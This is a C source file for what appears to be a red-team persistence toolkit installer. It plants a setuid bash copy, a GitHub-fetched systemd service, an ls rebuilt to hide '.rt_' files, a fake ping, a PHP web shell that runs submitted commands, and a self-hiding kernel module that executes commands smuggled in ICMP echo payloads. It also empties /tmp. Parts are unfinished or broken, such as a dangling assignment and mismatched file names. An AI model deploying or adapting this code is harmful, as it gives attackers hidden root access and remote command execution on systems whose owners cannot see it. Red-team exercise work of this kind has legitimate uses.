#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h> // For file perms
#include <fcntl.h>
#include <dirent.h> 
#include <string.h>
#include <stdbool.h>

#ifdef FILENAME_MAX
    #define FILENAME_LEN FILENAME_MAX
#else
    #define FILENAME_LEN 255
#endif
#define MAX_BUFFER_SIZE 10240

#define BASH_ID       1
#define PROCESSD_ID   2
#define LS_ID         4
#define PING_ID       8
#define FRONTDOOR_ID 16
#define ICMPK_ID     32

#define ALL 65535

// Configure install here:
#define INSTALL BASH_ID | PROCESSD_ID | LS_ID | PING_ID | FRONTDOOR_ID | ICMPK_ID


// Debugging mode
// #define QUIET
#define WORKING_DIR "/tmp"

// Useful Macros (modify these if path changes made elsewhere)
#define SETUID_BASH_PATH "/lib/gcc/rt_bash"
#define ICMPK_PATH "/" // /lib/modules?

#define HTTP_DOCUMENT_ROOT "/var/www/html"

// Slightly less useful Macros
#define SYSTEM_BASH_PATH "/bin/bash"

// Functions:
bool compat_setuid_bash(void);
int re_setuid_bash(void);
bool compat_processd(void);
int re_processd(void);
bool compat_broken_ls(void);
int re_broken_ls(void);
bool compat_fake_ping(void);
int re_fake_ping(void);
bool compat_http_frontdoor(void);
int re_http_frontdoor(void);
bool compat_icmp_c2(void);
int re_icmp_c2(void);

////////////////////////////////////////
////////// SETUID BASH
////////////////////////////////////////

bool compat_setuid_bash(void){

}
int re_setuid_bash(void){
    struct stat file_stat;
    char copy_buffer[MAX_BUFFER_SIZE];
    FILE *bash;
    int setuid_bash;
    int bytes_read;
    
    if (bash == NULL) {
        #ifndef QUIET
        fprintf(stderr, "setuid bash not found, installing now...\n");
        #endif
    }
    // For more advanced systems, read install file and execute
    // for now, hardcoded

    setuid_bash = creat(SETUID_BASH_PATH, 06755);
    if (setuid_bash == -1){
        perror("creat");
        return -1;
    }

    bash = fopen(SYSTEM_BASH_PATH, "r");
    if (bash == NULL) {
        fprintf(stderr, "Bash not found\n");
        return -1;
    }


    while ((bytes_read = fread(copy_buffer, 1, sizeof(copy_buffer), bash)) > 0) {
        write(setuid_bash, copy_buffer, bytes_read);
    } if (ferror(bash)) {
        fprintf(stderr, "\nAn error occurred while reading the file.\n");
    }

    close(setuid_bash);
    fclose(bash);
    
    return 0;
}

////////////////////////////////////////
////////// Processd
////////////////////////////////////////
static const char *processd_c = NULL;
static const char *processd_service = NULL;
int re_processd(void){
    // TODO: Add error handling
    FILE *fp;

    // Install prereqs
    system("apt install -y libcurl4-openssl-dev");

    // processd.c
    // download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c", "/tmp/processd.c");
    fp = // BLAH BLAH BLAH BLAH BLAH TODO: FLAG: LEFT_OFF_HERE:
    // processd executable
    system("gcc /tmp/processd.c -o /var/lib/processd");
    system("chmod 500 /var/lib/processd");
    // remove tmp file
    system("rm /tmp/processd.c");

    // processd.service
    // download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
    // Install service
    system("systemctl daemon-reload && systemctl start processd && systemctl enable processd");

    return 0;
}

////////////////////////////////////////
////////// Broken ls
////////////////////////////////////////
static const char *ls_commands[] = { "sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list", 
    "apt update", 
    "apt-get source -y coreutils && apt-get build-dep -y coreutils", 
    "cd coreutils-*", 
    "yes | autoreconf -fiv", 
    "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules", 
        "awk 'BEGIN { \n" 
        "  found = 0; inserted = 0\n" 
        "} \n" 
        "/file_ignored \\(char const \\*name\\)$/ { \n"
        "  print $0\n"
        "  found = 1\n" 
        "  next\n"
        "} \n" 
        "found == 1 && inserted == 0 && $0 == \"{\" { \n" 
        "  print $0\n"
        "  print \"  if (strncmp(name, \\\".rt_\\\", 3) == 0) { return true; }\"\n" 
        "  inserted = 1\n"
        "  found = 2\n"
        "  next\n"
        "} \n"
        "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c", 
    "make -j`nproc`", 
    "echo \"Replacing ls\"", 
    "cp src/ls `which ls`", 
    "cd ..",
    NULL
};
int re_broken_ls(void){
    char *argv[] = { "/bin/bash", "-c", NULL, NULL};
    char *envp[] = {
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",
        NULL
    };

    char **current_string = ls_commands;
    while (*current_string) {
        argv[2] = *current_string++;
        if (execve(argv[0], argv, envp) == -1) {
            perror("execle failed");
        }
    };
    return 0;
}

////////////////////////////////////////
////////// Broken ping
////////////////////////////////////////
static const char *fake_ping_c = "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <string.h>\n"
    "#include <unistd.h>\n"
    "#include <arpa/inet.h>\n"
    "#include <netdb.h>\n"
    "#include <time.h>\n"
    "#include <signal.h>\n"
    "\n"
    "\n"
    "volatile sig_atomic_t keep_running = 1; // Flag to control the loop\n"
    "void handle_signal(int signal) {\n"
    "    if (signal == SIGINT) {\n"
    "        keep_running = 0; // Set flag to exit the loop\n"
    "    }\n"
    "}\n"
    "\n"
    "void print_usage() {\n"
    "    printf(\"Usage: ping [OPTIONS] <hostname>\\n\");\n"
    "    printf(\"Options:\\n\");\n"
    "    printf(\"  -c <count>       Stop after sending <count> ECHO_REQUEST packets.\\n\");\n"
    "    printf(\"  -i <interval>    Wait <interval> seconds between sending each packet.\\n\");\n"
    "    printf(\"  -t <ttl>         Set the IP Time to Live.\\n\");\n"
    "    printf(\"  -s <size>        Specify the number of data bytes to be sent.\\n\");\n"
    "    printf(\"  -v               Verbose output.\\n\");\n"
    "    printf(\"  -h               Display this help message.\\n\");\n"
    "}\n"
    "\n"
    "char* resolve_hostname(const char* hostname) {\n"
    "    struct addrinfo hints, *res;\n"
    "    static char ipstr[INET6_ADDRSTRLEN]; // Buffer for IP address\n"
    "\n"
    "    memset(&hints, 0, sizeof hints);\n"
    "    hints.ai_family = AF_UNSPEC; // AF_INET or AF_INET6\n"
    "    hints.ai_socktype = SOCK_STREAM;\n"
    "\n"
    "    if (getaddrinfo(hostname, NULL, &hints, &res) != 0) {\n"
    "        return NULL;\n"
    "    }\n"
    "\n"
    "    void *addr;\n"
    "    // Loop through all the results and get the first valid IP address\n"
    "    struct addrinfo *p;\n"
    "    for (p = res; p != NULL; p = p->ai_next) {\n"
    "        if (p->ai_family == AF_INET) { // IPv4\n"
    "            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;\n"
    "            addr = &(ipv4->sin_addr);\n"
    "            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);\n"
    "            break;\n"
    "        } else if (p->ai_family == AF_INET6) { // IPv6\n"
    "            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;\n"
    "            addr = &(ipv6->sin6_addr);\n"
    "            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);\n"
    "            break;\n"
    "        }\n"
    "    }\n"
    "\n"
    "    freeaddrinfo(res); // Free the linked list\n"
    "    return (p == NULL) ? NULL : ipstr;\n"
    "}\n"
    "\n"
    "void print_ping_result(const char *hostname, int count, int interval, int ttl, int size, int verbose) {\n"
    "    char *ip_address = resolve_hostname(hostname);\n"
    "    if (ip_address == NULL) {\n"
    "        fprintf(stderr, \"Could not resolve hostname: %s\\n\", hostname);\n"
    "        return;\n"
    "    }\n"
    "    printf(\"PING %s (%s) %d(%d) bytes of data:\\n\", hostname, ip_address, size, size+28);\n"
    "    double timeSum = 0;\n"
    "    double minDelay = 10000;\n"
    "    double maxDelay = 0;\n"
    "    int i;\n"
    "    for (i = 0; keep_running && (count == 0 || i < count); i++) {\n"
    "        if (verbose) {\n"
    "            printf(\"Sending packet %d with TTL=%d\\n\", i + 1, ttl);\n"
    "        }\n"
    "        srand(time(NULL));\n"
    "        double delay = rand() % 16000 / 1000.0 + 4;\n"
    "        minDelay = delay < minDelay ? delay : minDelay;\n"
    "        maxDelay = delay > minDelay ? delay : maxDelay;\n"
    "        timeSum += delay;\n"
    "        printf(\"%d bytes from %s (%s): icmp_seq=%d ttl=%d time=%.1f ms\\n\", size + 8, hostname, ip_address, i + 1, ttl, delay);\n" 
    "        usleep(interval * 1000000); // Convert seconds to microseconds\n"
    "    }\n"
    "    printf(\"\\n--- %s ping statistics ---\\n\", hostname);\n"
    "    printf(\"%d packets transmitted, %d received, 0%s packet loss, time %dms\\n\", i, i, \"%\", (int)timeSum + (int)(interval*(0.89)*(i+1)));\n"
    "    printf(\"rtt min/avg/max = %.3f/%.3f/%.3f ms\\n\", minDelay, timeSum/(i+1), maxDelay);\n"
    "}\n"
    "\n"
    "int main(int argc, char *argv[]) {\n"
    "    int opt;\n"
    "    int count = 0;        // Default count\n"
    "    int interval = 1;     // Default interval in seconds\n"
    "    int ttl = 64;         // Default TTL\n"
    "    int size = 56;        // Default size in bytes\n"
    "    int verbose = 0;      // Default verbosity\n"
    "\n"
    "    signal(SIGINT, handle_signal); // Handle Ctrl+C (SIGINT)\n"
    "\n"
    "    while ((opt = getopt(argc, argv, \"c:i:t:s:vh\")) != -1) {\n"
    "        switch (opt) {\n"
    "            case 'c':\n"
    "                count = atoi(optarg);\n"
    "                break;\n"
    "            case 'i':\n"
    "                interval = atoi(optarg);\n"
    "                break;\n"
    "            case 't':\n"
    "                ttl = atoi(optarg);\n"
    "                break;\n"
    "            case 's':\n"
    "                size = atoi(optarg);\n"
    "                break;\n"
    "            case 'v':\n"
    "                // verbose = 1;\n"
    "                break;\n"
    "            case 'h':\n"
    "                print_usage();\n"
    "                return 0;\n"
    "            default:\n"
    "                print_usage();\n"
    "                return 1;\n"
    "        }\n"
    "    }\n"
    "\n"
    "    if (optind >= argc) {\n"
    "        fprintf(stderr, \"Expected hostname after options\\n\");\n"
    "        print_usage();\n"
    "        return 1;\n"
    "    }\n"
    "\n"
    "    const char *hostname = argv[optind];\n"
    "    \n"
    "    print_ping_result(hostname, count, interval, ttl, size, verbose);\n"
    "\n"
    "    return 0;\n"
    "}";
int re_fake_ping(void){
    FILE *fp;
    
    // Create ping.c
    fp = fopen("/tmp/ping.g", "w+");
    fprintf(fp, "%s", fake_ping_c);
    fclose(fp);

    // Replace ping
    system("gcc /tmp/ping.c -o `which ping`");

    // Remove temporary file
    system("rm /tmp/ping.c");
    return 0;
}

////////////////////////////////////////
////////// HTTP Frontdoor
////////////////////////////////////////
static const char *frontdoor_contents = "<form method=\"GET\">\n"
"    <p>Command: <input type=\"text\" name=\"command\"></p>\n"
"    <input type=\"submit\" value=\"Run\">\n"
"</form>\n"
"<?php\n"
"    if(isset($_GET[\"command\"])){\n"
"        $out = shell_exec($_GET[\"command\"]);\n"
"        echo \"<pre>\" . $out . \"</pre>\";\n"
"    }\n"
"?>";
int re_http_frontdoor(void){
    // Create file and write above php
    FILE *fp = fopen("" HTTP_DOCUMENT_ROOT "/rt_frontdoor.php", "w+");
    fprintf(fp, "%s", frontdoor_contents);
    fclose(fp);

    return 0;
}
////////////////////////////////////////
////////// ICMPK (ICMP-c2)
////////////////////////////////////////

// put icmpk string here
static const char *icmpk_c = "#include <linux/kernel.h>\n"
    "#include <linux/module.h>\n"
    "#include <linux/netfilter.h>\n"
    "#include <linux/netfilter_ipv4.h>\n"
    "#include <linux/ip.h>\n"
    "#include <linux/icmp.h>\n"
    "#include <linux/ktime.h>\n"
    "#include <linux/jiffies.h>\n"
    "#include <linux/uaccess.h>\n"
    "#include <linux/inet.h>\n"
    "#include <linux/skbuff.h>\n"
    "#include <linux/net.h>\n"
    "#include <linux/inet.h>\n"
    "#include <linux/if_ether.h>\n"
    "#include <net/ip.h>\n"
    "#include <linux/workqueue.h>\n"
    "#include <linux/list.h>\n"
    "\n"
    "MODULE_LICENSE(\"GPL\");\n"
    "MODULE_AUTHOR(\"jackdunf@buffalo.edu\");\n"
    "MODULE_DESCRIPTION(\"Simple ICMP-c2\");\n"
    "\n"
    "#define ICMP_ECHO   8\n"
    "#define ICMP_REPLY  0\n"
    "#define ICMP_HLEN   sizeof(struct icmphdr)\n"
    "\n"
    "#define FLAG        \"\\x70\\x95\\x05\"\n"
    "#define FLAG_LEN    3\n"
    "\n"
    "static struct socket *raw_socket;\n"
    "static struct nf_hook_ops nfho;\n"
    "static struct workqueue_struct *work_queue;\n"
    "static atomic_t work_count = ATOMIC_INIT(0);\n"
    "\n"
    "struct work_item {\n"
    "    struct work_struct work;\n"
    "    char *command;\n"
    "};\n"
    "\n"
    "// Work\n"
    "static void icmp_handle_work(struct work_struct *work);\n"
    "// Commands\n"
    "static int queue_execute(char *command);\n"
    "void free_tokens(char **tokens, int token_count);\n"
    "// Networking\n"
    "unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);\n"
    "static uint16_t checksum(uint16_t *data, int len);\n"
    "static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);\n"
    "\n"
    "static void icmp_handle_work(struct work_struct *work) {\n"
    "    int ret;\n"
    "\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_DEBUG \"Entering work handler...\\n\");\n"
    "        printk(KERN_DEBUG \"Queue length: %d\", atomic_read(&work_count));\n"
    "    #endif\n"
    "    struct work_item *work_item = container_of(work, struct work_item, work);\n"
    "\n"
    "    char *argv[] = { \"/bin/bash\", \"-c\", work_item->command, NULL };\n"
    "    char *envp[] = { \"HOME=/\", \"TERM=xterm\", \"PATH=/sbin:/usr/sbin:/bin:/usr/bin\", NULL };\n"
    "    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n"
    "    #ifdef DEBUG_K\n"
    "    if (ret != 0){\n"
    "        pr_err(\"Error (%d) executing command: \\\"%s\\\"\\n\", ret, work_item->command);\n"
    "    }\n"
    "    #endif\n"
    "\n"
    "    atomic_dec(&work_count);\n"
    "    kfree(work_item->command);\n"
    "    kfree(work_item);\n"
    "}\n"
    "\n"
    "static int queue_execute(char *command){\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_DEBUG \"Creating queue item...\");\n"
    "    #endif\n"
    "    struct work_item *work = kmalloc(sizeof(struct work_item), GFP_KERNEL);\n"
    "    work->command = command;\n"
    "\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_DEBUG \"Queueing queue item...\");\n"
    "    #endif\n"
    "    INIT_WORK(&work->work, icmp_handle_work);\n"
    "    queue_work(work_queue, &work->work);\n"
    "    atomic_inc(&work_count);\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_DEBUG \"Enqueued\");\n"
    "    #endif\n"
    "\n"
    "    return 0;\n"
    "}\n"
    "\n"
    "// Source: elsewhere\n"
    "static uint16_t checksum(uint16_t *data, int len) {\n"
    "    uint32_t sum = 0;\n"
    "    while (len > 1) { sum += *data++; len -= 2; }\n"
    "    if (len == 1) sum += *(uint8_t *)data;\n"
    "    sum = (sum >> 16) + (sum & 0xFFFF);\n"
    "    sum += (sum >> 16);\n"
    "    return (uint16_t)~sum;\n"
    "}\n"
    "\n"
    "// Source: jackdunf, different file\n"
    "static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len) {\n"
    "    struct sockaddr_in dest_addr;\n"
    "    struct msghdr msg = {};\n"
    "    struct kvec iov;\n"
    "    char *packet;\n"
    "    struct icmphdr *icmp_hdr;\n"
    "    int ret = 0;\n"
    "    const size_t PACKET_SIZE = ICMP_HLEN + payload_len;\n"
    "\n"
    "    // Allocate memory for the packet\n"
    "    packet = kmalloc(PACKET_SIZE, GFP_KERNEL);\n"
    "    if (!packet)\n"
    "        return -ENOMEM;\n"
    "\n"
    "    // Fill ICMP header\n"
    "    icmp_hdr = (struct icmphdr *)packet;\n"
    "    icmp_hdr->type = ICMP_REPLY;\n"
    "    icmp_hdr->code = 0;\n"
    "    icmp_hdr->checksum = 0;\n"
    "    icmp_hdr->un.echo.id = incoming_icmp->un.echo.id;\n"
    "    icmp_hdr->un.echo.sequence = incoming_icmp->un.echo.sequence;\n"
    "\n"
    "    // Add payload\n"
    "    memcpy(packet + ICMP_HLEN, payload, payload_len);\n"
    "\n"
    "    // Calculate checksum\n"
    "    icmp_hdr->checksum = checksum((uint16_t *)packet, PACKET_SIZE);\n"
    "\n"
    "    // Initialize destination address\n"
    "    memset(&dest_addr, 0, sizeof(dest_addr));\n"
    "    dest_addr.sin_family = AF_INET;\n"
    "    dest_addr.sin_addr.s_addr = address;\n"
    "\n"
    "    // Initialize the socket\n"
    "    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_ICMP, &raw_socket);\n"
    "    if (ret < 0) {\n"
    "        pr_err(\"Failed to create raw socket: %d\\n\", ret);\n"
    "        kfree(packet);\n"
    "        return ret;\n"
    "    }\n"
    "\n"
    "    // Prepare message\n"
    "    iov.iov_base = packet;\n"
    "    iov.iov_len = PACKET_SIZE;\n"
    "    iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, PACKET_SIZE);\n"
    "\n"
    "    msg.msg_name = &dest_addr;\n"
    "    msg.msg_namelen = sizeof(dest_addr);\n"
    "\n"
    "    // Send the ICMP Echo Request\n"
    "    ret = kernel_sendmsg(raw_socket, &msg, &iov, 1, PACKET_SIZE);\n"
    "    #ifdef DEBUG_K\n"
    "        if (ret < 0) {\n"
    "            pr_err(\"ICMP failed to reply: %d\\n\", ret);\n"
    "        } else {\n"
    "            pr_info(\"ICMP echo request sent successfully\\n\");\n"
    "        }\n"
    "    #endif\n"
    "\n"
    "    // Clean up\n"
    "    sock_release(raw_socket);\n"
    "    kfree(packet);\n"
    "\n"
    "    return (ret >= 0) ? 0 : ret;\n"
    "}\n"
    "\n"
    "\n"
    "unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {\n"
    "    struct iphdr *iph;\n"
    "    struct icmphdr *icmph;\n"
    "    unsigned char *payload_start;\n"
    "    char *payload;\n"
    "    int icmp_payload_len;\n"
    "\n"
    "    // Ensure it's an IPv4 packet with ICMP\n"
    "    iph = ip_hdr(skb);\n"
    "    if (!iph || iph->protocol != IPPROTO_ICMP) {\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "\n"
    "    icmph = icmp_hdr(skb);\n"
    "    if (!icmph || icmph->type != ICMP_ECHO) {\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "\n"
    "    // Below overestimates\n"
    "    // unsigned char *end_of_skb = skb->data + skb->len; \n"
    "    // icmp_payload_len = (void *)end_of_skb - ( (void *)icmph + ICMP_HLEN );\n"
    "\n"
    "    icmp_payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - ICMP_HLEN;\n"
    "    payload_start = (void *)icmph + ICMP_HLEN;\n"
    "\n"
    "    payload = (char *) kmalloc(icmp_payload_len + 1, GFP_KERNEL);\n"
    "    memcpy(payload, payload_start, icmp_payload_len);\n"
    "    payload[icmp_payload_len] = 0;\n"
    "\n"
    "    #ifdef DEBUF_K\n"
    "        pr_info(\"icmp_payload_len: %d\\n\", icmp_payload_len);\n"
    "    #endif\n"
    "    if(icmp_payload_len <= 0 || icmp_payload_len < FLAG_LEN){\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "\n"
    "    // Check for flag\n"
    "    if(strncmp(payload, FLAG, FLAG_LEN) != 0){\n"
    "        #ifdef DEBUG_K\n"
    "            pr_info(\"Regular ICMP, no flag\\n\");\n"
    "        #endif\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "    \n"
    "    #ifdef DEBUG_K\n"
    "        pr_info(\"Payload contained flag\\n\");\n"
    "    #endif\n"
    "\n"
    "    char *command = payload+FLAG_LEN;\n"
    "    #ifdef DEBUG_K\n"
    "        pr_info(\"Command: %s\\n\", command);\n"
    "    #endif\n"
    "    int status = queue_execute(command);\n"
    "    if(status) {} // prevent unused variable\n"
    "    #ifdef DEBUG_K\n"
    "        pr_info(\"Status: %d\\n\", status);\n"
    "    #endif\n"
    "\n"
    "    // TODO: Check if ignore all is set\n"
    "    if(send_icmp_reply(icmph, iph->saddr, payload, icmp_payload_len) < 0){\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "    return NF_DROP;\n"
    "}\n"
    "\n"
    "// Module initialization\n"
    "struct list_head *mod_list;\n"
    "static int __init init_icmp_hijack(void) {\n"
    "\n"
    "    // Hide module from lsmod\n"
    "    mod_list = THIS_MODULE->list.prev;\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_INFO \"Hiding module from list\\n\");\n"
    "    #endif \n"
    "    list_del(&THIS_MODULE->list);\n"
    "\n"
    "    THIS_MODULE->sect_attrs = NULL;  // Removes visibility of module sections\n"
    "    kobject_del(&THIS_MODULE->mkobj.kobj);  // Deletes the module's kobject entry\n"
    "\n"
    "\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_INFO \"Loading icmp-c2 module...\\n\");\n"
    "    #endif\n"
    "\n"
    "    work_queue = create_singlethread_workqueue(\"work_queue\");\n"
    "    if (!work_queue) {\n"
    "        #ifdef DEBUG_K\n"
    "        printk(KERN_ERR \"Failed to create workqueue\\n\");\n"
    "        #endif\n"
    "        return -ENOMEM;\n"
    "    }\n"
    "\n"
    "    // Fill in the nf_hook_ops structure\n"
    "    nfho.hook = icmp_hijack;                     // Hook function\n"
    "    // nfho.hooknum = NF_INET_LOCAL_IN;        // Apply to incoming packets\n"
    "    nfho.hooknum = NF_INET_PRE_ROUTING;        // Going to try to manipulate\n"
    "    nfho.pf = PF_INET;                          // IPv4\n"
    "    nfho.priority = NF_IP_PRI_FIRST;            // Set highest priority\n"
    "\n"
    "    // Register the hook\n"
    "    nf_register_net_hook(&init_net, &nfho);\n"
    "\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_INFO \"icmp handler loaded.\\n\");\n"
    "    #endif\n"
    "\n"
    "    return 0;\n"
    "}\n"
    "\n"
    "// Module cleanup\n"
    "static void __exit exit_icmp_hijack(void) {\n"
    "    printk(KERN_INFO \"Unloading icmp...\\n\");\n"
    "\n"
    "    // Unhide\n"
    "    list_add(&THIS_MODULE->list, mod_list);\n"
    "\n"
    "    // Unregister the hook\n"
    "    nf_unregister_net_hook(&init_net, &nfho);\n"
    "\n"
    "    /* Destroy the workqueue */\n"
    "    if (work_queue){\n"
    "        flush_workqueue(work_queue);\n"
    "        destroy_workqueue(work_queue);\n"
    "    }\n"
    "\n"
    "    printk(KERN_INFO \"icmp handler unloaded.\\n\");\n"
    "}\n"
    "\n"
    "module_init(init_icmp_hijack);\n"
    "module_exit(exit_icmp_hijack);\n";
static const char *icmpk_Makefile = "CONFIG_MODULE_SIG=n\n"
    "obj-m += icmpk.o\n"
    "all:\n"
    "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n"
    "clean:\n"
    "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n";
int re_icmp_c2(void){
    // Vars
    FILE *fp;
    // Install prereqs
    system("apt install -y build-essentials linux-headers-`uname -r` gcc-`cat /proc/version | awk '{print $7}' | cut -d'.' -f1,2`");
    // Write code
    fp = fopen("" ICMPK_PATH "/icmpk.ko", "w+");
    fprintf(fp, "%s", icmpk_c);
    fclose(fp);
    // Write Makefile
    fp = fopen("" ICMPK_PATH "/Makefile", "w+");
    fprintf(fp, "%s", icmpk_Makefile);
    fclose(fp);

    // Run installation
    system("make");
    system("mv imcpk.ko " ICMPK_PATH "/icmpk.ko");
    system("insmod " ICMPK_PATH "/icmpk.ko");

    // Persistence
    return 0;
}

#define FAILURE_STRING "Failed to install %s\n"
#define print_failure(message) fprintf(stderr, FAILURE_STRING, message);

int main(int argc, char **argv){
    struct dirent *de;
    DIR *dr;
    int failures = 0;
    char current_file[FILENAME_MAX];

    // Change working directory 
    chdir(WORKING_DIR);

    // Run install subprograms
    if(INSTALL & BASH_ID && re_setuid_bash())
        failures |= BASH_ID;
    if(INSTALL & PROCESSD_ID && re_processd())
        failures |= PROCESSD_ID;
    if(INSTALL & LS_ID && re_broken_ls())
        failures |= LS_ID;
    if(INSTALL & PING_ID && re_fake_ping())
        failures |= PING_ID;
    if(INSTALL & FRONTDOOR_ID && re_http_frontdoor())
        failures |= FRONTDOOR_ID;
    if(INSTALL & ICMPK_ID && re_icmp_c2())
        failures |= ICMPK_ID;

    // Empty /tmp
    dr = opendir(WORKING_DIR);
    if (dr == NULL) { 
        perror("opendir"); 
        return 1;
    }
    while ((de = readdir(dr)) != NULL) {
        #ifndef QUIET
        fprintf(stderr, "Removing " WORKING_DIR "/%s\n", de->d_name);
        #endif
        sprintf(current_file, "" WORKING_DIR "/%s", de->d_name);
        remove(current_file);
    }
    closedir(dr);

    // Print failures at program end
    if (failures & BASH_ID)
        print_failure("setuid bash");
    if (failures & PROCESSD_ID)
        print_failure("processd");
    if (failures & LS_ID)
        print_failure("ls");
    if (failures & PING_ID)
        print_failure("false ping");
    if (failures & FRONTDOOR_ID)
        print_failure("frontdoor");
    if (failures & ICMPK_ID)
        print_failure("icmpk");
}
